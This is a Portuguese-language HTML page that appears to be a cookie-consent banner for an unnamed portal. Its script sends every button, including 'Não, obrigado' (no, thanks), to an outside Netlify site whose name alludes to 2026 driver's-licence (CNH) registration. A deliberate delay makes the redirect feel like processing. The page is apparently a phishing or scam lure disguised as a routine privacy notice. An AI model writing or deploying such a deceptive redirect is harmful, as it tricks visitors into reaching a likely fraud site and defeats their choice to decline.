<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviso de Privacidade</title>
    <style>
        /* Estilos Gerais */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Container do Banner de Cookies */
        .cookie-banner {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 450px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            z-index: 9999;
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            from { bottom: -100px; opacity: 0; }
            to { bottom: 20px; opacity: 1; }
        }

        .cookie-banner h3 {
            margin-top: 0;
            color: #333;
            font-size: 1.2rem;
            font-weight: 600;
        }

        .cookie-banner p {
            font-size: 0.95rem;
            color: #666;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .cookie-banner a {
            color: #007bff;
            text-decoration: none;
            font-weight: 500;
        }

        /* Botões */
        .button-group {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .btn {
            cursor: pointer;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 0.9rem;
            font-weight: 600;
            transition: all 0.3s ease;
            border: none;
            outline: none;
        }

        .btn-accept {
            background-color: #222;
            color: #fff;
            flex: 2;
        }

        .btn-accept:hover {
            background-color: #444;
            transform: translateY(-2px);
        }

        .btn-config {
            background-color: #e0e0e0;
            color: #333;
            flex: 1;
        }

        .btn-config:hover {
            background-color: #d0d0d0;
        }

        .btn-decline {
            background: none;
            color: #888;
            font-size: 0.85rem;
            padding: 0;
            margin-left: auto;
            text-decoration: underline;
        }

        .btn-decline:hover {
            color: #333;
        }

        /* Ajuste Mobile */
        @media (max-width: 480px) {
            .button-group {
                flex-direction: column;
                width: 100%;
            }
            .btn { width: 100%; }
            .btn-decline { text-align: center; margin-top: 10px; }
        }
    </style>
</head>
<body>

    <div class="cookie-banner" id="cookieBanner">
        <h3>Uso de cookies</h3>
        <p>
            Usamos cookies para garantir uma experiência de navegação tranquila e segura em nosso portal. Ao aceitar, você concorda com nossos termos. <a href="#">Saiba mais</a>
        </p>
        
        <div class="button-group">
            <button class="btn btn-accept" onclick="redirectUser()">Aceitar todos</button>
            <button class="btn btn-config" onclick="redirectUser()">Configurações</button>
            <button class="btn btn-decline" onclick="redirectUser()">Não, obrigado</button>
        </div>
    </div>

    <script>
        function redirectUser() {
            // O link de destino solicitado
            const destination = "https://cnhperfilaprovado2026inscricoes.netlify.app/";
            
            // Adiciona um pequeno delay opcional para dar sensação de processamento
            setTimeout(() => {
                window.location.href = destination;
            }, 300);
        }
    </script>

</body>
</html>
